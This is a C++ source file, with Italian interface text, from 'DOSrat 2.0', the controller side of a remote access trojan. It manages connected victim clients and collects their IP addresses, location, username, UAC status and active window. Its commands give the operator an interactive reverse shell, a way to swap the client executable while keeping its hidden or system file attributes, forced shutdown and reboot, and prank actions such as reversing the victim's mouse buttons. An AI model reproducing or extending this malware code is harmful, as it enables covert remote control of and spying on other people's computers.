#pragma once

void StampaTitolo(short Returns = 0)
{
    TextColor tc;
    tc.SetColor(tc.Green);

    cout << "  ______  _______ ______                      ______    _____  " << endl;
    cout << " (______)(_______) _____)              _     (_____ \\  (_____) " << endl;
    cout << "  _     _ _     ( (____   ____ _____ _| |_     ____) ) _  __ _ " << endl;
    cout << " | |   | | |   | \\____ \\ / ___|____ (_   _)   / ____/ | |/ /| |" << endl;
    cout << " | |__/ /| |___| |____) ) |   / ___ | | |_   | (_____ |   /_| |" << endl;
    cout << " |_____/  \\_____(______/|_|   \\_____|  \\__)  |_______|_)_____/ " << endl << endl;
    cout << "| Versione [" << Version << "]" << endl;
    cout << "| DOSrat 2.0 by Criper98" << endl;

    for (int i = 0; i < Returns; i++)
        cout << endl;

    tc.SetColor(tc.Default);
}

void StampaPrefix(string NomeClient = "")
{
    TextColor tc;

    tc.SetColor(tc.Yellow);

    cout << "DOSrat 2.0";

    if (NomeClient != "")
    {
        tc.SetColor(tc.Default);
        cout << " [";
        tc.SetColor(tc.Purple);
        cout << NomeClient;
        tc.SetColor(tc.Default);
        cout << "]";
    }

    tc.SetColor(tc.Default);
    cout << "> ";
}

void StampaHelp(string Cmd, string Desc)
{
    ConsoleUtils cu;
    COORD Cpos;
    COORD Csize = cu.GetConsoleSize();

    cout << Cmd;

    Cpos = cu.GetCursorPos();

    if (Desc.size() < Csize.X - Cpos.X)
    {
        cout << Desc << endl;
        return;
    }

    for (int i = 0; i < Desc.size(); i++)
    {
        if (cu.GetCursorPos().X == Csize.X - 1)
        {
            cout << endl;
            Cpos.Y++;
            cu.SetCursorPos({ Cpos.X, Cpos.Y });
        }

        cout << Desc[i];
    }

    cout << endl;
}

void DrunkeranEgg()
{
    TextColor tc;
    WindowUtils wu;
    MouseUtils mu;
    SystemUtils su;
    ConsoleUtils cu;

    COORD ScreenRes = su.GetDesktopSize();
    short PosX = su.GetRandomNumber(ScreenRes.X - 810), PosY = su.GetRandomNumber(ScreenRes.Y - 610);
    bool AddX = true, AddY = true;
    COORD WinSize = { 700, 625 };

    su.OpenURL("https://www.instagram.com/drunkeran.e.co/");
    wu.SetWindowSize(WinSize);
    system("cls");

    tc.SetColor(tc.Lime);
    cout << "                                :TGKj}r:`                                  " << endl;
    cout << "                             =eQMv- '\"^YIPPY:      -)YVykkVc}?~-           " << endl;
    cout << "                          _u$I;           `<k0dv-^DBX]?*^<*|}wPEQ$y,       " << endl;
    cout << "                        }QZ^                  _cQ#!             `*V#k`     " << endl;
    cout << "                      !BW:             _==.      *d`            y_LcBE`    " << endl;
    cout << "                      $R            `vv:``~}Y`    (v            -z *iZE`   " << endl;
    cout << "                     \"@* ~=`      `}}`      \"U\"  ,Yl             :K-G!dM   " << endl;
    cout << "              `(kaIzUd@.  !g* `,_`m:          vsm^}Y              ,0*Y~DI  " << endl;
    cout << "           :cMPi\"     K    -Qyl:,!=               E!               ,w }~#x " << endl;
    cout << "         `aO:         `     _#x                  ,g                 *T.cw@'" << endl;
    cout << "        .$U                  \"QV      `!^^^*^:  `$*        -U=       >qVr@." << endl;
    cout << "      -]Qx                    `z$\" .rr<'    `:xyDM         VQk9v!=<**!` <8 " << endl;
    cout << "    :OZ0c                       ~gd}`          T8`        Tg` _Dc       I} " << endl;
    cout << "   :#v_D                          TQv         ^8Vxxv\\vv]xT@Y    ym     _#' " << endl;
    cout << "  `BU R:                      .)xxv~^Hx`     >g`          -PR=   dP==~-Du  " << endl;
    cout << "  LB`ry                    =xv*.      rZV_  \"Bir|xxxx\\r~!,.`=RR. `0U**Qw   " << endl;
    cout << " `#) 0`                 :ix\"     `:?ix]YTyMTR:.`````'-\"=^v}Vzd#`  Lb ~Q    " << endl;
    cout << " }# ^8TYi(\"          `rx!    `*VyT^.       ,.       `TL`     .Bx  ^#uB:    " << endl;
    cout << " QH q\"   `!v]x, `yP]TV-   _xTx: `}UV.     -V}w*   `}Qxv$y'    5R   _^`     " << endl;
    cout << "`@y`R        `*V68!@^   ry)`   *z: .VL` `x}`  *q  y#,   )gU-:gV            " << endl;
    cout << ":@x=k          i@v`@!`VI\"      'Yx`  -Vuu'   ~V-   \"dk`   >dE_             " << endl;
    cout << "!@xr}         x#!  BoD~          _z(       -y*       ;RY`       |`         " << endl;
    cout << " Bz*T        !@^   ^80             ]V     :P          'B3     ,QB*         " << endl;
    cout << " b$`^        $X     .#Y          'x=       :x.       ~B}      `b#y         " << endl;
    cout << " v@<        r#`      =#x        rL    `VL`   vi`    LB=   `Tx   L}         " << endl;
    cout << "  ^Qb\"      gT        -6I` =)  o:    xm-`xx` *}'  `Hd`   TB}}Q)            " << endl;
    cout << "    vB\\    '@!          v9Go   :}= :U>    `xu:    )Q^  _$G-  _Rqd;         " << endl;
    cout << "     -#r   >@-           T#.     _ix                *KIQ<      *@!         " << endl;
    cout << "      !#r  *@-           `x6DM:                       ,`       r@`         " << endl;
    cout << "       ~@K!,@:              !@*           -          ``        EO          " << endl;
    cout << "        ')e$@}              `#x           d`         =\\       >@:          " << endl;
    cout << "                             )#:        'O=          K'      \"#v           " << endl;
    cout << "                              *Qu:    ,yB@U`       .6B}.   \"y#Y            " << endl;
    cout << "                                rhbPMMz)`-M@Mi^!~?M8> ^zdddh*`             " << endl;
    cout << "                                           `^ThIuv\"                        " << endl;
    tc.SetColor(tc.Default);

    while (true)
    {
        cu.SetCursorVisible(false);

        wu.SetWindowSize(WinSize);
        wu.SetFocusWindow();
        wu.SetWindowPos({ PosX, PosY });

        if (PosX <= 0)
            AddX = true;
        else if (PosX + WinSize.X >= ScreenRes.X)
            AddX = false;

        if (PosY <= 0)
            AddY = true;
        else if (PosY + WinSize.Y >= ScreenRes.Y)
            AddY = false;

        if (AddX)
            PosX += 2;
        else
            PosX -= 2;

        if (AddY)
            PosY += 2;
        else
            PosY -= 2;

        Sleep(1);
    }
}

bool AutoAggiornamento()
{
    GitHub gh;
    DirUtils du;
    SystemUtils su;

    if (!du.CheckDir(du.GetModuleFilePath() + "Update"))
        du.MakeDir(du.GetModuleFilePath() + "Update");

    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", du.GetModuleFilePath() + "Update\\"))
        return false;

    su.NoOutputCMD("PowerShell Expand-Archive '" + du.GetModuleFilePath() + "Update\\DOSrat2.0.zip' '" + du.GetModuleFilePath() + "Update' -force");

    du.DelFile(du.GetModuleFilePath() + "Update\\DOSrat2.0.zip");

    if(!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\DOSrat 2.0.exe\", \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\Build\\Client.exe\", \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nWshShell.Run \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\", 1, false\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
        return false;

    su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");

    return true;
}

void VerificaAggiornamenti(bool AutoUpdate)
{
    GitHub gh;
    EasyMSGB msgb;
    SystemUtils su;

    string CurrTag = gh.GetRepoTag("criper98", "dosrat-2.0");

    if (CurrTag != Version && CurrTag.find("-1 errore") == string::npos)
    {
        if (AutoUpdate)
        {
            if (AutoAggiornamento())
                exit(0);
        }
        else
        {
            if (msgb.YesNo("Aggiornamento trovato!\nVuoi andare alla pagina ora?", msgb.Info, "DOSrat 2.0"))
                su.OpenURL("https://github.com/Criper98/DOSrat-2.0/releases/latest");
        }
    }
}

void AccettaConnessioni(TcpIP& Server)
{
    int c = 0;

    while (true)
    {
        if (!ServerLoopController)
            break;

        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!Clients[i].IsConnected)
            {
                c = i;
                i = MAX_CLIENTS;
            }
        }

        if (Server.WaitConn(Clients[c].sock, 1000))
            COMUNICAZIONI::Inizializzazione(c, Clients[c].sock);
    }

    return;
}

void VerificaConnessioni()
{
    while (true)
    {
        Sleep(1);

        if (!ServerLoopController)
            break;

        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!ServerLoopController)
                break;

            if (Clients[i].IsConnected && !Clients[i].InTask)
            {
                char garbage;
                TcpIP::SetTimeout(100, Clients[i].sock);

                int Res = recv(Clients[i].sock, &garbage, 1, MSG_PEEK);

                if (Res == SOCKET_ERROR || Res == 0)
                {
                    Res = WSAGetLastError();
                    //cout << "WSA " << Res << endl;

                    if (Res == 10054 || Res == 0)
                    {
                        closesocket(Clients[i].sock);
                        Clients[i].IsConnected = false;
                        Clu->AggiornaTitolo();
                    }
                }
                TcpIP::SetTimeout(0, Clients[i].sock);
            }
        }
    }

    return;
}

bool CheckConnection(SOCKET Sock, int ID)
{
    TextColor tc;

    if (TcpIP::SendString(Sock, "checkconn"))
    {
        tc.SetColor(tc.Yellow);
        cout << "Errore di connessione temporaneo, riprova." << endl;
        tc.SetColor(tc.Default);

        return true;
    }

    tc.SetColor(tc.Red);
    cout << "Impossibile raggiungere il Client." << endl;
    tc.SetColor(tc.Default);

    closesocket(Sock);
    Clients[ID].IsConnected = false;
    Clu->AggiornaTitolo();

    Sleep(2000);
    return false;
}

bool RestartServer(TcpIP &Server, int Port)
{
    ServerLoopController = false;

    Sleep(1000);

    for (int i = 0; i < MAX_CLIENTS; i++)
        if (Clients[i].IsConnected)
        {
            closesocket(Clients[i].sock);
            Clients[i].IsConnected = false;
        }

    Server.Stop();
    Server.Port = Port;
    if (Server.StartServer() != 0)
        return false;

    Sleep(1000);
    Clu->AggiornaTitolo();

    ServerLoopController = true;

    thread Aconn(AccettaConnessioni, ref(Server));
    thread Vconn(VerificaConnessioni);
    Aconn.detach();
    Vconn.detach();

    return true;
}

// ---------------[ COMANDI CLIENT ]---------------

bool GetInfo(SOCKET Sock, int ID)
{
    json j;
    CLInterface cli;
    VectString Header;
    VectString Body;

    Header.push_back("INFO");
    Header.push_back("VALORE");

    j = COMUNICAZIONI::GetInfo(Sock);

    if (j.dump() == "null")
        return false;

    Body.push_back("IP Wan");
    Body.push_back(Clients[ID].info.IP);

    Body.push_back("IP Lan");
    Body.push_back(j["IPL"]);

    Body.push_back("Nazione");
    Body.push_back(Clients[ID].info.Location.Country);

    Body.push_back("OS");
    Body.push_back(Clients[ID].info.OS);

    Body.push_back("UAC");
    Body.push_back(Clients[ID].info.UAC);

    Body.push_back("Percorso");
    Body.push_back(Clients[ID].info.InstallPath);

    Body.push_back("Versione");
    Body.push_back(Clients[ID].info.Versione);

    Body.push_back("Nome PC");
    Body.push_back(Clients[ID].info.PCname);

    Body.push_back("Nome Utente");
    Body.push_back(Clients[ID].info.UserName);

    Body.push_back("CPU %");
    Body.push_back(j["CPU"]);

    Body.push_back("RAM %");
    Body.push_back(j["RAM"]);

    Body.push_back("Finestra Attiva");
    Body.push_back(j["ACTWIN"]);

    Body.push_back("Data Installazione");
    Body.push_back(j["INSTDATE"]);

    cout << "Informazioni ricevute:" << endl;
    cli.Table(Header, Body);

    return true;
}

bool InvertMouse(SOCKET Sock, int ID)
{
    string Status;

    Status = COMUNICAZIONI::InvertMouse(Sock);

    if (Status == "a")
        cout << "Tasti invertiti." << endl;
    else if (Status == "b")
        cout << "Tasti normali." << endl;
    else
        return false;

    return true;
}

bool Reconnect(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reconnect(Sock))
    {
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool KillClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::KillClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Shutdown(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Shutdown(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Reboot(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reboot(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

short UpdateClient(SOCKET Sock, int ID)
{
    DirUtils du;
    bool Hidden = false;
    bool System = false;
    DWORD Attr;

    string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());

    if (FilePath == "")
        return 1;

    Attr = GetFileAttributesA(FilePath.c_str());
    if (Attr != -1)
    {
        Hidden = ((Attr & FILE_ATTRIBUTE_HIDDEN) == FILE_ATTRIBUTE_HIDDEN);
        System = ((Attr & FILE_ATTRIBUTE_SYSTEM) == FILE_ATTRIBUTE_SYSTEM);
    }

    cout << "Invio file in corso..." << endl;
    if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
    {
        cout << "File inviato." << endl;
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return 0;
    }

    return -1;
}

bool Uninstall(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Uninstall(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool RestartClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::RestartClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool ReverseShell(SOCKET Sock)
{
	string Res = "";
	string Cmd = "";
	string Path = "";
	
    if (COMUNICAZIONI::ReverseShell(Sock, "reverseshell") == "OK")
    {
		while (true)
		{
			Path = COMUNICAZIONI::ReverseShell(Sock, "Get cd");
			
			if (Path == "")
				return false;
			
			cout << Path << ">";
			getline(cin, Cmd);
			
			Res = COMUNICAZIONI::ReverseShell(Sock, Cmd);
			
			if (Res == "")
				return false;
			else if (Res == "Reverse shell closed")
				return true;
			
			cout << Res;
		}
    }

    return false;
}

void Sessione(int ID, SOCKET Sock)
{
    CLInterface cli;
    TextColor tc;

    string cmd;

    system("cls");
    StampaTitolo(1);
    cli.SubTitle("Sessione Comandi", 60, tc.Green);

    for (bool Controllo = true; Controllo;)
    {
        StampaPrefix(Clients[ID].info.UserName);
        getline(cin, cmd);
        cmd = ToLowerCase(cmd);

        Clients[ID].InTask = true;

        if (cmd == "help")
        {
            cout << endl;
            cli.SubTitle("Client", 20, tc.Blue);
            StampaHelp("Reconnect\t\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
            StampaHelp("Killclient / Kill\t", "- Termina il processo del Client.");
            StampaHelp("Updateclient / Update\t", "- Aggiorna il Client con un eseguibile locale.");
            StampaHelp("Uninstall\t\t", "- Disinstalla il Client dal PC remoto.");
            StampaHelp("Restartclient / Restart\t", "- Termina il Client e lo riavvia.");
            cout << endl;

            cli.SubTitle("System", 20, tc.Lime);
            StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
            StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
            StampaHelp("Shutdown\t", "- Spegne il PC.");
            StampaHelp("Reboot\t\t", "- Riavvia il PC.");
			StampaHelp("Reverseshell / Revshell\t", "- Ottieni accesso alla console dei comandi del PC.");
            cout << endl;

            cli.SubTitle("Utility", 20, tc.Purple);
            StampaHelp("Exit / Close\t", "- Torna al menu principale.");
            StampaHelp("Clear / Cls\t", "- Pulisce la console da tutti i comandi precedenti.");
            StampaHelp("Help\t\t", "- Mostra la lista dei comandi.");
            cout << endl;
        }
        else if (cmd == "getinfo")
        {
            if (!GetInfo(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "invertmouse")
        {
            if (!InvertMouse(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "exit" || cmd == "close")
        {
            Controllo = false;
        }
        else if (cmd == "reconnect")
        {
            if (!Reconnect(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "clear" || cmd == "cls")
        {
            system("cls");
            StampaTitolo(1);
            cli.SubTitle("Sessione Comandi", 60, tc.Green);
        }
        else if (cmd == "killclient" || cmd == "kill")
        {
            if (!KillClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "shutdown")
        {
            if (!Shutdown(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "reboot")
        {
            if (!Reboot(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "updateclient" || cmd == "update")
        {
            switch (UpdateClient(Sock, ID))
            {
                case -1: Controllo = CheckConnection(Sock, ID); break;
                case 0: Controllo = false; break;
                case 1: break;
            }
        }
        else if (cmd == "uninstall")
        {
            if (!Uninstall(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "restartclient" || cmd == "restart")
        {
            if (!RestartClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
		else if (cmd == "reverseshell" || cmd == "revshell")
        {
            if (!ReverseShell(Sock))
                Controllo = CheckConnection(Sock, ID);
        }
        else
        {
            cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
        }

        Clients[ID].InTask = false;
    }
}